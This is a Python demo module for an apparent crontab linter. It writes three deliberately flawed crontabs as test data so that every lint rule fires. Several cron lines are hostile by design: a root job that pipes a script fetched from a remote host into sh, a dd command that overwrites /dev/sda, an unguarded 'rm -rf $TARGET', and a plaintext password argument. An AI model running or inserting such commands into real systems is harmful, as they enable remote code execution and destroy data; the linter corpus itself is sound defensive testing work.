"""Three deliberately bad crontabs that between them fire every rule.

Nothing is checked in as a binary and nothing is downloaded: the corpora are
written as text here, and the two script files the shebang rule has to read are
created in a temporary directory at run time. That keeps the repository
readable as source and makes the demo prove the file-reading rule rather than
skip it.
"""

from __future__ import annotations

import tempfile
from pathlib import Path

from .engine import run
from .model import App, Report
from .parser import parse
from .rules import REGISTRY

CRON_D_HEADER = """# /etc/cron.d/app -- deliberately bad, for the demo corpus
SHELL=/bin/sh
PATH=/tmp:/usr/bin
TZ=UTC
CRON_TZ=Asia/Shanghai
OPTS=a b c
"""

USER_HEADER = """# user crontab -- the second shape, no user column
MAILTO=ops@example.com
DEST="/var/backups"
"""

EMPTY = """# nothing scheduled here
SHELL=/bin/sh
"""


def _scripts(workdir: Path) -> tuple[Path, Path]:
    """Write the two scripts the shebang rule reads."""
    plain = workdir / "job_plain.sh"
    plain.write_text("echo hi\n", encoding="utf-8", newline="\n")
    signed = workdir / "job_shebang.sh"
    signed.write_text("#!/bin/bash\necho hi\n", encoding="utf-8", newline="\n")
    return plain, signed


def _cron_d_body(plain: Path, signed: Path) -> str:
    long_tail = "x" * 520
    return f"""
*/15 * * * * root /usr/local/bin/collect >> /var/log/m.log 2>&1
* * * * * root /tmp/refresh.sh
0 3 * * * root /opt/backup/nightly.sh --password=hunter2
0 1 * * * root curl -s http://x.io/i.sh | sh
30 4 * * 1-5 root /opt/reports/weekly "$DEST"
*/0 * * * * root /opt/jobs/broken
60 * * * * root /opt/jobs/oor
10-5 * * * * root /opt/jobs/back
0 0 * * xyz root /opt/jobs/bad
* * * * * * root /opt/jobs/seconds
@every 5m root /opt/jobs/nope
0 12 * * mon root /opt/a.sh
0 12 * * mon root /opt/a.sh
0 12 * * mon root /opt/b.sh
0 12 * * fri root /opt/c.sh
0 2 * * * root echo done > /etc/cron.allow
* * * * * root /opt/w1.sh >> /var/log/shared.log
0 1 * * * root /opt/w2.sh >> /var/log/shared.log
@reboot root xterm -e /opt/gui.sh
0 4 * * * root echo "$HOME" && rm -rf $TARGET
0 6 * * * root /usr/bin/needs_tty
0 5 * * * root dd if=/dev/zero of=/dev/sda bs=512
0 5 * * * root echo `whoami` > /var/log/who.log
0 5 * * * root {plain}
0 5 * * * root {signed}
0 5 * * * root /opt/a very long command {long_tail}
"""


def _user_body() -> str:
    return """
0 0 0 1 1 * 2030 /opt/yearly.sh
0 12 * * 7 /opt/sunday.sh
0 0 1 * mon /opt/both-days.sh
@reboot /usr/local/bin/tunnel
0 12 * * mon
0 12 * * mon /opt/only-command
"""


def build(workdir: str | Path | None = None) -> list[tuple[str, str, str]]:
    """Return ``(name, source, text)`` for each corpus.

    ``workdir`` is where the two scripts are written; it defaults to a fresh
    temporary directory, so ``cronlint demo`` needs no arguments.
    """
    if workdir is None:
        workdir = Path(tempfile.mkdtemp(prefix="cronlint-demo-"))
    directory = Path(workdir)
    directory.mkdir(parents=True, exist_ok=True)
    plain, signed = _scripts(directory)

    return [
        (
            "cron.d",
            "/etc/cron.d/app",
            CRON_D_HEADER + _cron_d_body(plain, signed),
        ),
        (
            "user-crontab",
            "crontab",
            USER_HEADER + _user_body(),
        ),
        (
            "empty",
            "empty.cron",
            EMPTY,
        ),
    ]


def apps(workdir: str | Path | None = None) -> list[tuple[str, App]]:
    """Parse every corpus into an :class:`App`."""
    return [(name, parse(text, source=source)) for name, source, text in build(workdir)]


def reports(workdir: str | Path | None = None) -> list[tuple[str, Report]]:
    """Run the whole rule table over every corpus."""
    return [(name, run(app, target=name)) for name, app in apps(workdir)]


def coverage(workdir: str | Path | None = None) -> tuple[set[str], int]:
    """Which rules fired across all corpora, and how many rules exist."""
    fired: set[str] = set()
    for _, report in reports(workdir):
        fired |= report.fired
    return fired, len(REGISTRY)
